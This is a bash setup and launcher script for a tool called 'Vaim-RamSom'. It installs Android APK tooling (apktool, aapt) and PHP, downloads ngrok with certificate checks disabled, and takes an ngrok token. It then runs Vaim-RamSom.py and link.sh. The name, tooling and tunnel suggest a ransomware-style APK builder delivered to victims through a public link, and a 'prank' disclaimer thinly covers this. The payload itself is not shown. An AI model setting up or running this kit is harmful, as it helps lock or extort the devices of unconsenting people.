#! /usr/bin/bash
#Youtube channel : https://www.youtube.com/channel/UCDWhaLh7OIKzH4Bk952l7Iw
#Github (coded by vaimpier ritik ) >>> : https://github.com/VaimpierOfficial
#For business : sonuv0085@gmail.com
#vaimpier
#==========================================================================================================================
#--

clear
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""

printf "Installing dependencies ..."
sleep 2
printf "installing package: php"
sudo apt-get install php -y
printf "installing package: default-jdk"
sudo apt-get install default-jdk -y
printf "installing package: aapt"
sudo apt-get install aapt -y
printf "installing package: apktool"
sudo apt-get install apktool -y
printf "installing package: imagemagick"
sudo apt-get install imagemagick -y
printf "installing pacakge: python3"
sudo apt-get install python3 python3-pip -y
printf "installing modules: pillow"
pip3 install Pillow
if [[ -f "ngrok-stable-linux-amd64.zip" ]]; then
	rm ngrok
	unzip ngrok-stable-linux-amd64.zip
	rm -rf ngrok-stable-linux-amd64.zip
	
else
	rm ngrok
	wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --no-check-certificate
	unzip ngrok-stable-linux-amd64.zip
	rm -rf ngrok-stable-linux-amd64.zip

fi

clear
echo ""
read -p $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m Enter The Ngrok Token [Ex. 1Y7IU ] : \e[0m' token
./ngrok authtoken $token
sleep2
clear
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
sleep 4
clear




printf "Successfully Installed !!!"
clear


printf "\n"
printf "\e[1;91m____   ____      .__              \e[0m\e[1;93m   __________                  _________                \e[0m\n "
printf "\e[1;91m\   \ /   /____  |__| _____       \e[0m\e[1;93m   \______   \_____    _____  /   _____/ ____   _____   \e[0m\n "
printf "\e[1;91m \   Y   /\__  \ |  |/     \   ___\e[0m\e[1;93m___ |       _/\__  \  /     \ \_____  \ /  _ \ /     \  \e[0m\n "
printf "\e[1;91m  \     /  / __ \|  |  Y Y  \ /___\e[0m\e[1;93m__/ |    |   \ / __ \|  Y Y  \/        (  <_> )  Y Y  \ \e[0m\n "
printf "\e[1;91m   \___/  (____  /__|__|_|  /     \e[0m\e[1;93m    |____|_  /(____  /__|_|  /_______  /\____/|__|_|  / \e[0m\n "
printf "\e[1;91m               \/         \/      \e[0m\e[1;93m           \/      \/      \/        \/             \/  \e[0m\n "
printf "\n"

printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[1;31m           By VaimpierOfficial (Vaimpier Ritik)  \e[0m                            \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]           v2.0 coded by @vaimpier                                           \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]           https://www.youtube.com/channel/UCDWhaLh7OIKzH4Bk952l7Iw          \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf "\n"
printf "        \e[1;91m Disclaimer: this tool is designed for Prank\n"
printf "         testing in an authorized simulated cyberattack\n"
printf "         Attacking targets without prior mutual consent\n"
printf "         is illegal!\n"
printf "\n"




read -p "[!] Do You Want To Open ? 
1.) Yes
2.) No

Answer in numeric (1/2)

>>> " dec

if [[ $dec -eq 1 ]]; then
        clear
	printf "\e[1;77mWait Vaim-RamSom.py Opening.......\e[0m"
        sleep 2
	clear
	python3 Vaim-RamSom.py && bash link.sh
	sleep 3
        

else
        exit
fi





